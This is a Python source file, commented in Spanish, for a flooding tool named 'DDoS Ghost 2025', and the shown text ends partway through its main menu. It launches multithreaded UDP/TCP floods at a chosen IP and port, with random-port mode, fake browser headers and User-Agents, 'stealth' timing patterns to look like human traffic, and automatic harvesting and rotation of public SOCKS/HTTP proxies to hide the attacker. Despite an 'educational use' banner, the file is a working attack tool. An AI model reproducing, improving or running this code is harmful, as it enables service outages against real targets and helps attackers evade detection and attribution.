#!/usr/bin/env python3

import sys
import os
import time
import socket
import random
import argparse
import threading
import signal
import requests
import socks
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from ipaddress import ip_address, IPv4Address

# Configuración global
sent_packets = 0
start_time = time.time()
attack_running = True
lock = threading.Lock()
proxy_list = []
current_proxy_index = 0
proxy_rotation_counter = 0
config_file = "ghost_config.json"
reports_file = "ghost_reports.json"

# Base de datos extendida de User-Agents reales
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/119.0 Firefox/119.0',
    'Mozilla/5.0 (Android 14; Mobile; LG-M255; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
]

# Headers HTTP adicionales para mayor realismo
HTTP_HEADERS = [
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: es-ES,es;q=0.8,en;q=0.3',
    'Accept-Language: fr-FR,fr;q=0.9,en;q=0.1',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: none',
    'DNT: 1',
    'Cache-Control: max-age=0'
]

# Patrones de timing que simulan comportamiento humano
TIMING_PATTERNS = {
    'aggressive': (0.001, 0.005),
    'normal': (0.01, 0.05),
    'stealth': (0.1, 0.5),
    'human_like': (1.0, 3.0)
}

# Estilos ANSI para colores en la terminal


class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'


def clear_screen():
    """Limpiar la pantalla de manera compatible con diferentes OS"""
    os.system('cls' if os.name == 'nt' else 'clear')


def validate_ip(ip):
    """Validar que la dirección IP sea válida"""
    try:
        return str(ip_address(ip))
    except ValueError:
        return False


def validate_port(port):
    """Validar que el puerto esté en el rango correcto"""
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return port
        return False
    except ValueError:
        return False


def signal_handler(sig, frame):
    """Maneja la interrupción del usuario con CTRL+C"""
    global attack_running
    print(f"\n{Colors.YELLOW}[*] Deteniendo el ataque...{Colors.ENDC}")
    attack_running = False
    time.sleep(1.5)
    save_report()
    show_stats()
    sys.exit(0)


def load_config():
    """Carga configuración desde archivo JSON"""
    default_config = {
        "default_threads": 50,
        "default_method": "random",
        "timing_pattern": "normal",
        "proxy_rotation_freq": 25,
        "user_agent_rotation": True,
        "stealth_mode": False
    }

    try:
        if os.path.exists(config_file):
            with open(config_file, 'r') as f:
                config = json.load(f)
                return {**default_config, **config}
    except BaseException:
        pass

    return default_config


def save_config(config):
    """Guarda configuración en archivo JSON"""
    try:
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=4)
        print(
            f"{Colors.GREEN}[+] Configuración guardada en {config_file}{Colors.ENDC}")
    except Exception as e:
        print(
            f"{Colors.RED}[!] Error guardando configuración: {str(e)}{Colors.ENDC}")


def save_report():
    """Guarda reporte del ataque en archivo JSON"""
    global sent_packets, start_time, proxy_rotation_counter

    duration = time.time() - start_time
    pps = sent_packets / duration if duration > 0 else 0

    report = {
        "timestamp": datetime.now().isoformat(),
        "duration": round(duration, 2),
        "packets_sent": sent_packets,
        "packets_per_second": round(pps, 2),
        "proxy_rotations": proxy_rotation_counter,
        "proxies_used": len(proxy_list)
    }

    try:
        reports = []
        if os.path.exists(reports_file):
            with open(reports_file, 'r') as f:
                reports = json.load(f)

        reports.append(report)

        # Mantener solo los últimos 50 reportes
        if len(reports) > 50:
            reports = reports[-50:]

        with open(reports_file, 'w') as f:
            json.dump(reports, f, indent=4)

        print(
            f"{Colors.GREEN}[+] Reporte guardado en {reports_file}{Colors.ENDC}")
    except Exception as e:
        print(
            f"{Colors.RED}[!] Error guardando reporte: {str(e)}{Colors.ENDC}")


def show_stats():
    """Muestra estadísticas del ataque"""
    global sent_packets, start_time, proxy_rotation_counter
    duration = time.time() - start_time
    if duration > 0:
        pps = sent_packets / duration
    else:
        pps = 0

    print(
        f"\n{
            Colors.BOLD}{
            Colors.BLUE}═══════════ Estadísticas del Ataque ═══════════{
                Colors.ENDC}")
    print(
        f"{Colors.GREEN}[+] Paquetes Enviados: {Colors.BOLD}{sent_packets:,}{Colors.ENDC}")
    print(
        f"{Colors.GREEN}[+] Duración: {Colors.BOLD}{duration:.2f} segundos{Colors.ENDC}")
    print(
        f"{Colors.GREEN}[+] Paquetes por segundo: {Colors.BOLD}{pps:.2f}{Colors.ENDC}")
    if len(proxy_list) > 0:
        print(
            f"{Colors.GREEN}[+] Rotaciones de proxy: {Colors.BOLD}{proxy_rotation_counter}{Colors.ENDC}")
        print(
            f"{Colors.GREEN}[+] Proxies utilizados: {Colors.BOLD}{len(proxy_list)}{Colors.ENDC}")
    print(f"{Colors.BLUE}═════════════════════════════════════════{Colors.ENDC}\n")


def update_display(target_ip, target_port, use_proxy=False,
                   timing_pattern="normal"):
    """Actualiza la visualización en tiempo real"""
    global sent_packets, start_time, proxy_rotation_counter

    while attack_running:
        duration = time.time() - start_time
        if duration > 0:
            pps = sent_packets / duration
        else:
            pps = 0

        clear_screen()
        print(
            f"{
                Colors.BOLD}{
                Colors.PURPLE}╔═══════════════════════════════════════════════════╗{
                Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.PURPLE}║         DDoS Ghost 2025 - Versión Mejorada       ║{Colors.ENDC}")
        print(
            f"{
                Colors.BOLD}{
                Colors.PURPLE}╚═══════════════════════════════════════════════════╝{
                Colors.ENDC}")
        print(
            f"{Colors.BLUE}[*] Objetivo: {Colors.RED}{target_ip}:{target_port}{Colors.ENDC}")
        print(
            f"{Colors.BLUE}[*] Tiempo transcurrido: {Colors.YELLOW}{duration:.2f}s{Colors.ENDC}")
        print(
            f"{Colors.BLUE}[*] Paquetes enviados: {Colors.YELLOW}{sent_packets:,}{Colors.ENDC}")
        print(
            f"{Colors.BLUE}[*] Velocidad: {Colors.YELLOW}{pps:.2f} paquetes/s{Colors.ENDC}")
        print(
            f"{Colors.BLUE}[*] Patrón de timing: {Colors.CYAN}{timing_pattern}{Colors.ENDC}")

        if use_proxy and len(proxy_list) > 0:
            print(
                f"{Colors.BLUE}[*] Modo anónimo: {Colors.GREEN}Activo{Colors.ENDC}")
            print(
                f"{Colors.BLUE}[*] Proxies cargados: {Colors.YELLOW}{len(proxy_list)}{Colors.ENDC}")
            print(
                f"{Colors.BLUE}[*] Rotaciones de proxy: {Colors.YELLOW}{proxy_rotation_counter}{Colors.ENDC}")
            if current_proxy_index < len(proxy_list):
                current_proxy = proxy_list[current_proxy_index]
                proxy_type = current_proxy['type']
                proxy_ip = current_proxy['ip']
                proxy_port = current_proxy['port']
                print(
                    f"{Colors.BLUE}[*] Proxy actual: {Colors.CYAN}{proxy_type}://{proxy_ip}:{proxy_port}{Colors.ENDC}")
        else:
            print(
                f"{Colors.BLUE}[*] Modo anónimo: {Colors.RED}Desactivado{Colors.ENDC}")

        print(
            f"{Colors.GREEN}[*] Ataque en progreso... Presiona CTRL+C para detener{Colors.ENDC}")
        time.sleep(1)


def test_proxy(proxy):
    """Prueba si un proxy está funcionando"""
    try:
        if proxy['type'] == 'http':
            test_proxy_dict = {
                'http': f"http://{proxy['ip']}:{proxy['port']}",
                'https': f"http://{proxy['ip']}:{proxy['port']}"
            }
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=test_proxy_dict,
                timeout=5)
            return response.status_code == 200
        elif proxy['type'] in ['socks4', 'socks5']:
            # Para SOCKS, realizamos una prueba de conexión simple
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            try:
                sock.connect((proxy['ip'], proxy['port']))
                sock.close()
                return True
            except BaseException:
                sock.close()
                return False
    except BaseException:
        return False


def verify_and_score_proxies(proxy_list):
    """Verifica y puntúa los proxies disponibles"""
    working_proxies = []

    print(
        f"{Colors.BLUE}[*] Verificando {len(proxy_list)} proxies...{Colors.ENDC}")

    for i, proxy in enumerate(proxy_list):
        if not attack_running:  # Si se interrumpe durante la verificación
            break

        print(
            f"{
                Colors.YELLOW}[*] Probando proxy {
                i + 1}/{
                len(proxy_list)}: {
                    proxy['ip']}:{
                        proxy['port']}{
                            Colors.ENDC}",
            end='\r')

        start_test = time.time()
        if test_proxy(proxy):
            response_time = time.time() - start_test
            proxy['response_time'] = response_time
            # Mayor puntuación para proxies más rápidos
            proxy['score'] = 1.0 / (response_time + 0.1)
            working_proxies.append(proxy)

    # Ordenar por puntuación (mejores primero)
    working_proxies.sort(key=lambda x: x.get('score', 0), reverse=True)

    print(
        f"\n{
            Colors.GREEN}[+] {
            len(working_proxies)} proxies verificados y funcionales{
                Colors.ENDC}")
    return working_proxies


def generate_advanced_packet(min_size=64, max_size=1490, stealth_mode=False):
    """Genera paquetes avanzados con mayor realismo"""
    size = random.randint(min_size, max_size)

    # Cabecera más realista
    header = bytes([random.randint(0, 255) for _ in range(8)])

    # ID de transacción más realista
    transaction_id = random.randint(
        1000000, 9999999).to_bytes(
        4, byteorder='big')

    # User-Agent aleatorio
    user_agent = random.choice(USER_AGENTS)

    # Headers HTTP adicionales aleatorios
    additional_headers = random.sample(HTTP_HEADERS, random.randint(2, 5))

    # Construir request HTTP más realista
    if stealth_mode:
        # En modo sigiloso, usar patrones que parecen tráfico legítimo
        methods = ['GET', 'POST']
        paths = [
            '/',
            '/index.html',
            '/api/status',
            '/favicon.ico',
            '/robots.txt']
        versions = ['HTTP/1.1', 'HTTP/2.0']

        method = random.choice(methods)
        path = random.choice(paths)
        version = random.choice(versions)

        http_request = f"{method} {path} {version}\r\n"
        http_request += f"User-Agent: {user_agent}\r\n"
        http_request += f"Host: target-server.com\r\n"

        for header_line in additional_headers:
            http_request += f"{header_line}\r\n"

        http_request += "\r\n"
        legitimate_content = http_request.encode()
    else:
        # Modo normal con mayor variabilidad
        legitimate_headers = [
            b'GET / HTTP/1.1\r\n',
            b'POST /api/data HTTP/1.1\r\n',
            b'PUT /upload HTTP/1.1\r\n',
            b'HEAD /status HTTP/1.1\r\n',
            b'OPTIONS * HTTP/1.1\r\n'
        ]

        legitimate_content = random.choice(legitimate_headers)
        legitimate_content += f"User-Agent: {user_agent}\r\n".encode()

    # Payload con patrones más diversos
    patterns = [
        bytes([i % 256 for i in range(64)]),
        bytes([random.randint(0, 255) for _ in range(64)]),
        b'A' * 64,
        b'0' * 64,
        os.urandom(64),
        b'Cache-Control: no-cache\r\n',
        b'Pragma: no-cache\r\n',
        b'Accept: */*\r\n'
    ]

    payload = legitimate_content
    remaining = size - len(header) - \
        len(legitimate_content) - len(transaction_id)

    while remaining > 0:
        pattern = random.choice(patterns)
        if len(pattern) > remaining:
            payload += pattern[:remaining]
            remaining = 0
        else:
            payload += pattern
            remaining -= len(pattern)

    return header + transaction_id + payload


def get_free_proxies():
    """Obtiene una lista de proxies gratuitos desde varias fuentes mejoradas"""
    proxies = []

    sources = [
        'https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&filterUpTime=80',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt',
        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
        'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt'
    ]

    for source in sources:
        try:
            if 'geonode.com' in source:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    for proxy in data.get('data', []):
                        ip = proxy.get('ip')
                        port = proxy.get('port')
                        protocol = proxy.get('protocols', ['http'])[0].lower()
                        if ip and port and protocol in [
                                'http', 'socks4', 'socks5']:
                            proxies.append({
                                'ip': ip,
                                'port': int(port),
                                'type': protocol
                            })
            else:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    for line in response.text.split('\n'):
                        if ':' in line and not line.startswith('#'):
                            parts = line.strip().split(':')
                            if len(parts) >= 2:
                                ip = parts[0]
                                port = parts[1]
                                if ip and port:
                                    # Determinar tipo basado en la fuente
                                    if 'socks5' in source:
                                        proxy_type = 'socks5'
                                    elif 'socks4' in source:
                                        proxy_type = 'socks4'
                                    else:
                                        proxy_type = 'http'

                                    proxies.append({
                                        'ip': ip,
                                        'port': int(port),
                                        'type': proxy_type
                                    })
        except BaseException:
            continue

    # Lista de respaldo mejorada
    if not proxies:
        proxies = [
            {'ip': '103.152.112.162', 'port': 80, 'type': 'http'},
            {'ip': '193.36.39.35', 'port': 4145, 'type': 'socks4'},
            {'ip': '185.151.86.121', 'port': 3699, 'type': 'socks5'},
            {'ip': '178.62.229.24', 'port': 7497, 'type': 'socks5'},
            {'ip': '95.179.242.185', 'port': 10823, 'type': 'socks5'},
            {'ip': '51.158.119.88', 'port': 1080, 'type': 'socks5'},
            {'ip': '95.216.181.107', 'port': 9070, 'type': 'socks5'},
            {'ip': '207.180.204.70', 'port': 48462, 'type': 'socks5'}
        ]

    # Eliminar duplicados
    unique_proxies = []
    seen = set()
    for proxy in proxies:
        key = f"{proxy['ip']}:{proxy['port']}"
        if key not in seen:
            seen.add(key)
            unique_proxies.append(proxy)

    return unique_proxies


def load_proxies_from_file(file_path):
    """Carga proxies desde un archivo de texto con mejor manejo"""
    proxies = []

    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()

        for line_num, line in enumerate(lines, 1):
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            try:
                # Formato esperado: tipo:ip:puerto o ip:puerto:tipo o
                # simplemente ip:puerto
                parts = line.split(':')
                if len(parts) >= 2:
                    ip = parts[0]
                    port = int(parts[1])
                    proxy_type = 'http'  # tipo por defecto

                    if len(parts) >= 3:
                        if parts[2].lower() in ['http', 'socks4', 'socks5']:
                            proxy_type = parts[2].lower()
                        elif parts[0].lower() in ['http', 'socks4', 'socks5']:
                            proxy_type = parts[0].lower()
                            ip = parts[1]
                            port = int(parts[2])

                    proxies.append({
                        'ip': ip,
                        'port': port,
                        'type': proxy_type
                    })
            except ValueError:
                print(
                    f"{Colors.YELLOW}[!] Línea {line_num} ignorada (formato inválido): {line}{Colors.ENDC}")
                continue

    except Exception as e:
        print(
            f"{Colors.RED}[!] Error al cargar el archivo de proxies: {str(e)}{Colors.ENDC}")

    return proxies


def rotate_proxy():
    """Rota al siguiente proxy en la lista con mejor gestión"""
    global current_proxy_index, proxy_rotation_counter

    if not proxy_list:
        return None

    with lock:
        current_proxy_index = (current_proxy_index + 1) % len(proxy_list)
        proxy_rotation_counter += 1

    return proxy_list[current_proxy_index]


def get_current_proxy():
    """Obtiene el proxy actual"""
    if not proxy_list or current_proxy_index >= len(proxy_list):
        return None

    return proxy_list[current_proxy_index]


def setup_proxy_socket(proxy=None):
    """Configura un socket que usa un proxy con mejor manejo de errores"""
    if not proxy:
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    proxy_type = proxy['type']
    proxy_ip = proxy['ip']
    proxy_port = proxy['port']

    try:
        if proxy_type == 'http':
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        elif proxy_type == 'socks4':
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(socks.SOCKS4, proxy_ip, proxy_port)
        elif proxy_type == 'socks5':
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(socks.SOCKS5, proxy_ip, proxy_port)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        return sock
    except Exception as e:
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def send_packet(target_ip, target_port, sock_type="udp", use_proxy=False,
                timing_pattern="normal", stealth_mode=False, rotation_freq=25):
    """Envía un solo paquete al objetivo con mejoras avanzadas"""
    global sent_packets

    try:
        current_proxy = get_current_proxy() if use_proxy else None

        # Rotación de proxy basada en frecuencia configurable
        if use_proxy and sent_packets % rotation_freq == 0 and sent_packets > 0:
            current_proxy = rotate_proxy()

        if sock_type == "udp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        elif sock_type == "tcp":
            if use_proxy and current_proxy:
                sock = setup_proxy_socket(current_proxy)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            sock.settimeout(5)
            try:
                if use_proxy and current_proxy and current_proxy['type'] == 'http':
                    sock.connect((current_proxy['ip'], current_proxy['port']))
                    connect_str = f"CONNECT {target_ip}:{target_port} HTTP/1.1\r\nHost: {target_ip}:{target_port}\r\n\r\n"
                    sock.send(connect_str.encode())
                    response = sock.recv(4096)
                    if b"200" not in response:
                        sock.close()
                        return False
                else:
                    sock.connect((target_ip, target_port))
            except BaseException:
                sock.close()
                return False
        else:
            return False

        # Generar paquete avanzado
        packet = generate_advanced_packet(stealth_mode=stealth_mode)

        # Enviar paquete
        if sock_type == "udp":
            sock.sendto(packet, (target_ip, target_port))
        else:
            sock.send(packet)

        sock.close()

        with lock:
            sent_packets += 1

        return True
    except Exception as e:
        if use_proxy:
            rotate_proxy()
        return False


def attack_thread(target_ip, target_port, sock_type, use_proxy=False,
                  timing_pattern="normal", stealth_mode=False, rotation_freq=25):
    """Función para cada hilo de ataque con timing mejorado"""
    timing_range = TIMING_PATTERNS.get(
        timing_pattern, TIMING_PATTERNS['normal'])

    while attack_running:
        if sock_type == "random":
            current_sock_type = random.choice(["udp", "tcp"])
        else:
            current_sock_type = sock_type

        if target_port == 0:
            port = random.randint(1, 65535)
        else:
            port = target_port

        send_packet(
            target_ip,
            port,
            current_sock_type,
            use_proxy,
            timing_pattern,
            stealth_mode,
            rotation_freq)

        # Pausa con patrón de timing seleccionado
        sleep_time = random.uniform(timing_range[0], timing_range[1])
        time.sleep(sleep_time)


def start_attack(target_ip, target_port, threads, sock_type, use_proxy=False,
                 timing_pattern="normal", stealth_mode=False, rotation_freq=25):
    """Inicia el ataque con configuraciones avanzadas"""
    global attack_running, start_time

    start_time = time.time()
    attack_running = True

    signal.signal(signal.SIGINT, signal_handler)

    display_thread = threading.Thread(
        target=update_display,
        args=(
            target_ip,
            target_port,
            use_proxy,
            timing_pattern))
    display_thread.daemon = True
    display_thread.start()

    attack_threads = []
    for _ in range(threads):
        thread = threading.Thread(
            target=attack_thread,
            args=(
                target_ip,
                target_port,
                sock_type,
                use_proxy,
                timing_pattern,
                stealth_mode,
                rotation_freq))
        thread.daemon = True
        attack_threads.append(thread)
        thread.start()

    try:
        while attack_running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        signal_handler(None, None)


def show_banner():
    """Muestra el banner mejorado del programa"""
    now = datetime.now()

    clear_screen()
    print(
        f"{
            Colors.BOLD}{
            Colors.PURPLE}╔═══════════════════════════════════════════════════╗{
                Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.PURPLE}║         DDoS Ghost 2025 - Versión Mejorada       ║{Colors.ENDC}")
    print(
    f"{
        Colors.BOLD}{
            Colors.PURPLE}╚═══════════════════════════════════════════════════╝{
                Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Versión: {Colors.GREEN}4.0.0{Colors.ENDC}")
    print(
    f"{Colors.BLUE}[*] Fecha: {Colors.GREEN}{now.strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}")
    print(
    f"{
        Colors.BLUE}[*] Características: {
        Colors.GREEN}Anonimato avanzado, verificación de proxies, reportes{
        Colors.ENDC}")
    print(
    f"{Colors.BLUE}[*] Nuevas funciones: {Colors.GREEN}Timing inteligente, User-Agents reales, modo sigiloso{Colors.ENDC}")
    print(
    f"{
        Colors.BLUE}[*] Uso: {
        Colors.GREEN}Este script es solo para fines educativos y pruebas en entornos controlados{
        Colors.ENDC}")
    print(
    f"{Colors.BLUE}[*] Optimizado para Termux (No requiere root){Colors.ENDC}")
    print(
    f"{
        Colors.RED}[!] Advertencia: El uso no autorizado de esta herramienta es ilegal{
        Colors.ENDC}")
    print(
    f"{
        Colors.BOLD}{
        Colors.PURPLE}═════════════════════════════════════════════════════{
        Colors.ENDC}\n")


def setup_proxy_environment(
        proxy_file=None, auto_proxy=False, verify_proxies=False):
    """Configura el entorno de proxies con verificación opcional"""
    global proxy_list

    if proxy_file:
        print(
            f"{Colors.BLUE}[*] Cargando proxies desde archivo: {Colors.YELLOW}{proxy_file}{Colors.ENDC}")
        proxy_list = load_proxies_from_file(proxy_file)
    elif auto_proxy:
        print(
            f"{Colors.BLUE}[*] Obteniendo lista de proxies gratuitos...{Colors.ENDC}")
        proxy_list = get_free_proxies()

    if proxy_list:
        print(
            f"{
                Colors.GREEN}[+] Se cargaron {
                Colors.BOLD}{
                len(proxy_list)}{
                    Colors.ENDC}{
                        Colors.GREEN} proxies{
                            Colors.ENDC}")

        if verify_proxies:
            proxy_list = verify_and_score_proxies(proxy_list)
            if proxy_list:
                print(
                    f"{Colors.GREEN}[+] {len(proxy_list)} proxies verificados y listos para usar{Colors.ENDC}")
            else:
                print(
                    f"{Colors.RED}[!] No se encontraron proxies funcionales{Colors.ENDC}")
                return False

        return True
    else:
        print(
            f"{
                Colors.YELLOW}[!] No se pudieron cargar proxies. El ataque no será anónimo.{
                Colors.ENDC}")
        return False


def show_reports():
    """Muestra reportes anteriores"""
    try:
        if not os.path.exists(reports_file):
            print(
                f"{Colors.YELLOW}[!] No se encontraron reportes anteriores{Colors.ENDC}")
            return

        with open(reports_file, 'r') as f:
            reports = json.load(f)

        if not reports:
            print(
                f"{Colors.YELLOW}[!] No hay reportes disponibles{Colors.ENDC}")
            return

        print(
            f"\n{
                Colors.BOLD}{
                Colors.BLUE}═══════════ Reportes Anteriores ═══════════{
                Colors.ENDC}")

        for i, report in enumerate(reports[-10:], 1):  # Mostrar últimos 10
            timestamp = datetime.fromisoformat(
                report['timestamp']).strftime('%Y-%m-%d %H:%M:%S')
            print(f"{Colors.GREEN}[{i}] {timestamp}{Colors.ENDC}")
            print(
                f"    Duración: {
                    report['duration']}s | Paquetes: {
                    report['packets_sent']:,        } | PPS: {
                    report['packets_per_second']}")
            print(
                f"    Proxies: {
                    report['proxies_used']} | Rotaciones: {
                    report['proxy_rotations']}")

        print(f"{Colors.BLUE}═════════════════════════════════════════{Colors.ENDC}\n")

    except Exception as e:
        print(f"{Colors.RED}[!] Error al leer reportes: {str(e)}{Colors.ENDC}")


def show_config_menu():
    """Muestra menú de configuración avanzada"""
    config = load_config()

    while True:
        clear_screen()
        print(
            f"{
                Colors.BOLD}{
                Colors.CYAN}╔═══════════ Configuración Avanzada ═══════════╗{
                Colors.ENDC}")
        print(
            f"{Colors.CYAN}║                                               ║{Colors.ENDC}")
        print(
            f"{
                Colors.CYAN}║  1. Hilos por defecto: {
                config['default_threads']:<20}     ║{
                Colors.ENDC}")
        print(
            f"{
                Colors.CYAN}║  2. Método por defecto: {
                config['default_method']:<18}     ║{
                Colors.ENDC}")
        print(
            f"{
                Colors.CYAN}║  3. Patrón de timing: {
                config['timing_pattern']:<20}       ║{
                Colors.ENDC}")
        print(
            f"{
                Colors.CYAN}║  4. Frecuencia rotación proxy: {
                config['proxy_rotation_freq']:<12}     ║{
                Colors.ENDC}")
        print(
            f"{Colors.CYAN}║  5. Rotación User-Agent: {str(config['user_agent_rotation']):<15}     ║{Colors.ENDC}")
        print(
            f"{Colors.CYAN}║  6. Modo sigiloso: {str(config['stealth_mode']):<22}     ║{Colors.ENDC}")
        print(
            f"{Colors.CYAN}║                                               ║{Colors.ENDC}")
        print(
            f"{Colors.CYAN}║  s. Guardar configuración                     ║{Colors.ENDC}")
        print(
            f"{Colors.CYAN}║  q. Volver al menú principal                  ║{Colors.ENDC}")
        print(
            f"{Colors.CYAN}╚═══════════════════════════════════════════════╝{Colors.ENDC}")

        choice = input(
            f"\n{
                Colors.BLUE}[?] Selecciona una opción: {
                Colors.ENDC}").lower()

        if choice == '1':
            try:
                threads = int(
                    input(f"{Colors.BLUE}[?] Número de hilos (1-500): {Colors.ENDC}"))
                if 1 <= threads <= 500:
                    config['default_threads'] = threads
                else:
                    print(
                        f"{Colors.RED}[!] Valor debe estar entre 1 y 500{Colors.ENDC}")
                    input("Presiona Enter para continuar...")
            except ValueError:
                print(f"{Colors.RED}[!] Valor inválido{Colors.ENDC}")
                input("Presiona Enter para continuar...")

        elif choice == '2':
            print("Métodos disponibles: udp, tcp, random")
            method = input(f"{Colors.BLUE}[?] Método: {Colors.ENDC}").lower()
            if method in ['udp', 'tcp', 'random']:
                config['default_method'] = method
            else:
                print(f"{Colors.RED}[!] Método inválido{Colors.ENDC}")
                input("Presiona Enter para continuar...")

        elif choice == '3':
            print("Patrones disponibles: aggressive, normal, stealth, human_like")
            pattern = input(
                f"{Colors.BLUE}[?] Patrón de timing: {Colors.ENDC}").lower()
            if pattern in TIMING_PATTERNS:
                config['timing_pattern'] = pattern
            else:
                print(f"{Colors.RED}[!] Patrón inválido{Colors.ENDC}")
                input("Presiona Enter para continuar...")

        elif choice == '4':
            try:
                freq = int(
                    input(f"{Colors.BLUE}[?] Frecuencia de rotación (10-100): {Colors.ENDC}"))
                if 10 <= freq <= 100:
                    config['proxy_rotation_freq'] = freq
                else:
                    print(
                        f"{Colors.RED}[!] Valor debe estar entre 10 y 100{Colors.ENDC}")
                    input("Presiona Enter para continuar...")
            except ValueError:
                print(f"{Colors.RED}[!] Valor inválido{Colors.ENDC}")
                input("Presiona Enter para continuar...")

        elif choice == '5':
            config['user_agent_rotation'] = not config['user_agent_rotation']

        elif choice == '6':
            config['stealth_mode'] = not config['stealth_mode']

        elif choice == 's':
            save_config(config)
            input("Presiona Enter para continuar...")

        elif choice == 'q':
            break


def install_dependencies():
    """Instala las dependencias necesarias si faltan"""
    try:
        import socks
        import requests
    except ImportError:
        print(
            f"{Colors.YELLOW}[!] Faltan dependencias necesarias. Instalando...{Colors.ENDC}")
        os.system('pip3 install requests pysocks')
        print(
            f"{Colors.GREEN}[+] Dependencias instaladas correctamente{Colors.ENDC}")

        try:
            import socks
            import requests
        except ImportError:
            print(
                f"{
                    Colors.RED}[!] Error al instalar dependencias. Por favor, instale manualmente:{
                    Colors.ENDC}")
            print(f"{Colors.BLUE}    pip3 install requests pysocks{Colors.ENDC}")
            sys.exit(1)


def main():
    """Función principal del programa mejorada"""
    install_dependencies()

    show_banner()

    # Cargar configuración
    config = load_config()

    # Mostrar menú principal
    while True:
        print(
            f"{
                Colors.BOLD}{
                Colors.WHITE}════════════════ MENÚ PRINCIPAL ════════════════{
                Colors.ENDC}")
        print(f"{Colors.GREEN}[1] Iniciar ataque DDoS{Colors.ENDC}")
        print(f"{Colors.BLUE}[2] Configuración avanzada{Colors.ENDC}")
        print(f"{Colors.CYAN}[3] Ver reportes anteriores{Colors.ENDC}")
        print(f"{Colors.YELLOW}[4] Verificar proxies{Colors.ENDC}")
        print(f"{Colors.RED}[5] Salir{Colors.ENDC}")
        print(
            f"{Colors.WHITE}════════════════════════════════════════════════{Colors.ENDC}")

        choice = input(
            f"\n{
                Colors.BLUE}[?] Selecciona una opción: {
                Colors.ENDC}")

        if choice == '1':
            break
        elif choice == '2':
            show_config_menu()
            show_banner()
        elif choice == '3':
            show_reports()
            input("Presiona Enter para continuar...")
            clear_screen()
            show_banner()
        elif choice == '4':
            proxy_file = input(
                f"{Colors.BLUE}[?] Archivo de proxies (o Enter para obtener automáticamente): {Colors.ENDC}")
            if proxy_file:
                proxy_list_temp = load_proxies_from_file(proxy_file)
            else:
                print(
                    f"{Colors.BLUE}[*] Obteniendo proxies automáticamente...{Colors.ENDC}")
                proxy_list_temp = get_free_proxies()

            if proxy_list_temp:
                verified = verify_and_score_proxies(proxy_list_temp)
